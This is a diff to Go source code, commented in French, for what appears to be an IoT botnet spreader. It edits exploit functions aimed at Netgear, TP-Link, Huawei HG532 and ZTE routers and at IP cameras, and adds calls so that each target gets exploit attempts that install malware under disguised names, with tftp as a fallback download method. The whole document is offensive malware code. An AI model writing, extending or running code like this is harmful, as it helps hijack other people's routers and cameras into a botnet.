@@ -107,7 +107,7 @@ type Vulnerability struct {
     name        string
     description string
     check       func(string) bool
-    exploit     func(string, string, string, string) bool
+    exploit     func(string, string, string) bool
 }
 
 // Structure pour les méthodes de téléchargement
@@ -263,7 +263,7 @@ func isPortOpen(target string, timeout time.Duration) bool {
  }
 
 // Exploiter la vulnérabilité dans les routeurs Netgear
-func exploitNetgearRCE(target string, c2Server string, hideName string, malwarePath string) bool {
+func exploitNetgearRCE(target string, hideName string, malwarePath string) bool {
 	// Vulnérabilité d'exécution de commande dans les routeurs Netgear
 	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
 	if err != nil {
@@ -302,7 +302,7 @@ func exploitNetgearRCE(target string, c2Server string, hideName string, malwareP
 }
 
 // Exploiter la vulnérabilité dans les caméras IP
-func exploitIPCameraRCE(target string, c2Server string, hideName string, malwarePath string) bool {
+func exploitIPCameraRCE(target string, hideName string, malwarePath string) bool {
 	// Vulnérabilité d'exécution de commande dans les caméras IP
 	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
 	if err != nil {
@@ -340,7 +340,7 @@ func exploitIPCameraRCE(target string, c2Server string, hideName string, malware
 }
 
 // Exploiter la vulnérabilité dans les routeurs TP-Link
-func exploitTPLinkRCE(target string, c2Server string, hideName string, malwarePath string) bool {
+func exploitTPLinkRCE(target string, hideName string, malwarePath string) bool {
 	// Vulnérabilité d'exécution de commande dans les routeurs TP-Link
 	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
 	if err != nil {
@@ -362,7 +362,7 @@ func exploitTPLinkRCE(target string, c2Server string, hideName string, malwarePa
 }
 
 // Exploiter la vulnérabilité dans les routeurs Huawei HG532
-func exploitHuaweiRCE(target string, c2Server string, hideName string, malwarePath string) bool {
+func exploitHuaweiRCE(target string, hideName string, malwarePath string) bool {
 	// Vulnérabilité d'exécution de commande dans les routeurs Huawei HG532
 	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
 	if err != nil {
@@ -387,7 +387,7 @@ func exploitHuaweiRCE(target string, c2Server string, hideName string, malwarePa
 }
 
 // Exploiter la vulnérabilité dans les routeurs ZTE
-func exploitZTERCE(target string, c2Server string, hideName string, malwarePath string) bool {
+func exploitZTERCE(target string, hideName string, malwarePath string) bool {
 	// Vulnérabilité d'exécution de commande dans les routeurs ZTE
 	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
 	if err != nil {
@@ -515,13 +515,22 @@ func sendExploit(target string) int {
 
 	// Exploiter d'autres vulnérabilités connues dans différents appareils
 	// 1. Exploiter la vulnérabilité RCE dans les routeurs D-Link
-	exploitDlinkRCE(target, c2Server, hideNames[rand.Intn(len(hideNames))], malwares[0].path)
+	exploitDlinkRCE(target, hideNames[rand.Intn(len(hideNames))], malwares[0].path)
 	
 	// 2. Exploiter la vulnérabilité dans les routeurs Netgear
-	exploitNetgearRCE(target, c2Server, hideNames[rand.Intn(len(hideNames))], malwares[0].path)
+	exploitNetgearRCE(target, hideNames[rand.Intn(len(hideNames))], malwares[0].path)
 	
 	// 3. Exploiter la vulnérabilité dans les caméras IP
-	exploitIPCameraRCE(target, c2Server, hideNames[rand.Intn(len(hideNames))], malwares[0].path)
+	exploitIPCameraRCE(target, hideNames[rand.Intn(len(hideNames))], malwares[0].path)
+
+	// 4. Exploiter la vulnérabilité dans les routeurs TP-Link
+	exploitTPLinkRCE(target, hideNames[rand.Intn(len(hideNames))], malwares[0].path)
+
+	// 5. Exploiter la vulnérabilité dans les routeurs Huawei HG532
+	exploitHuaweiRCE(target, hideNames[rand.Intn(len(hideNames))], malwares[0].path)
+
+	// 6. Exploiter la vulnérabilité dans les routeurs ZTE
+	exploitZTERCE(target, hideNames[rand.Intn(len(hideNames))], malwares[0].path)
 	
 	// 4. Essayer aussi avec tftp comme méthode alternative de téléchargement
 	for _, installPath := range installPaths[:3] { // Limiter aux 3 premiers chemins pour économiser du temps
